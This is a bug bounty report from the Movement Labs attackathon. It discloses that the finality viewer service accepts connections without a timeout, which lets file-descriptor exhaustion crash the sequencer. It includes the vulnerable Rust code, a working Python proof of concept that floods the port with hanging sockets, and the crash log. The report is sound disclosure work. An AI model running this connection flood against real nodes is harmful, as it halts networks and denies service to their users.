# #43251 \[BC-Critical] Lack of TCP timeout allows attacker to crash the sequencer via the finality viewer service

**Submitted on Apr 4th 2025 at 02:48:02 UTC by @usmannk for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #43251
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/protocol-units/execution/maptos/dof>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

The finality service is started by the Movement Full Node and serves HTTP requests. However this service does not have any sort of timeout on its requests. This allows an attacker to crash the sequencer via resource exhaustion.

## Vulnerability Details

the finality viewer service is bound to the ip address 0.0.0.0 in both the default and suggested (<https://docs.movementnetwork.xyz/assets/files/config-4551e1260977506ebb8dcdea19b254ed.json>) configurations. Because 0.0.0.0 allows requests from not just the local host but any IP address on the internet, an attacker may call this RPC from outside the local network.

Each HTTP request opened to the service creates a file descriptor on the host. By default nix OS allows 256 file descriptors per process. By spamming the service with connection requests and leaving them hanging, an attacker can use up all available file descriptors for the full node. At this point, the full node cannot accept or initiate any further connections. It will cease to receive new transactions or send any to DA.

## Impact Details

The sequencer will not be able to process transactions submit batches to DA. It will then also panic and crash, halting the network.

## References

`protocol-units/execution/maptos/fin-view/src/service.rs`

```
pub fn run(&self) -> impl Future<Output = Result<(), anyhow::Error>> + Send {
		info!("Starting maptos-fin-view services at: {:?}", self.listen_url);

		let api_service =
			get_api_service(self.context.clone()).server(format!("http://{:?}", self.listen_url));

		let ui = api_service.swagger_ui();

		let cors = Cors::new()
			.allow_methods(vec![Method::GET, Method::POST])
			.allow_credentials(true);
		let app = Route::new().nest("/v1", api_service).nest("/spec", ui).with(cors);

		Server::new(TcpListener::bind(self.listen_url.clone()))
			.run(app)
			.map_err(|e| anyhow::anyhow!("Server error: {:?}", e))
	}
```

## Proof of Concept

## Proof of Concept

* run movement stack by calling just movement-full-node native build.setup.celestia-local.eth-local
* run the following python code pointed at the address and port of the finality viewer service

```
import socket
server_address = ('localhost', 30733)
arr = []
for _ in range(9999): # adjust for fd limit, likely 256 will suffice
     arr.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
     arr[-1].connect(server_address)
```

* observe as the sequencer node becomes unavailable then the sequencer crashes, halting the network.

```
Error: readiness check fail - exit status 56                                                                                                                            ││
2025-04-04T02:45:35.957587Z  INFO movement_full_node::node::manager: Receive Terminate Signal 
thread 'tokio-runtime-worker' panicked at /Users/<redacted>/.cargo/registry/src/index.crates.io-6f17d22bba15001f/tokio-1.41.1/src/runtime/blocking/shutdown.rs:51:21:
Cannot drop a runtime in a context where blocking is not allowed. This happens when a runtime is dropped from within an asynchronous context.
stack backtrace:
```
